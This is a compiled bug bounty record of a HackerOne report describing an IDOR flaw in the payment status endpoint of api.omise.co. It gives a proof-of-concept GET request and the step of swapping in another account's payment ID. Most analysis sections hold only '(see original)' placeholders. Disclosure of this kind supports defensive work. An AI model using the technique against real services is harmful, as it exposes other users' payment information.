# IDOR Payments Status

## Metadata
- **Source:** HackerOne
- **Report:** 1538669 | https://hackerone.com/reports/1538669
- **Submitted:** 2022-04-12
- **Reporter:** codeslayer1337
- **Program:** Unknown
- **Bounty:** $100
- **Severity:** low
- **Vuln:** Business Logic Errors
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:

Found in the payment status function, IDOR's weakness.
Where when doing the experiment managed to see the payment status of another account
The following is the POC of the experiments carried out.
## Steps To Reproduce:
1.GET /payments/paym_test_xxxx/status HTTP/2
Host: api.omise.co
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
User

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:

Found in the payment status function, IDOR's weakness.
Where when doing the experiment managed to see the payment status of another account
The following is the POC of the experiments carried out.
## Steps To Reproduce:
1.GET /payments/paym_test_xxxx/status HTTP/2
Host: api.omise.co
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://api.omise.co/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

2.changed the id of the payment on the part I replaced it with paym_test_xxxx

## Impact

The application does not validate the requested payment status value, whether it belongs to the account or not, so that attackers can see the payment status of other people's accounts,


Best regards,


Codeslayer137

</details>

---
*Analysed by Claude on 2026-05-24*
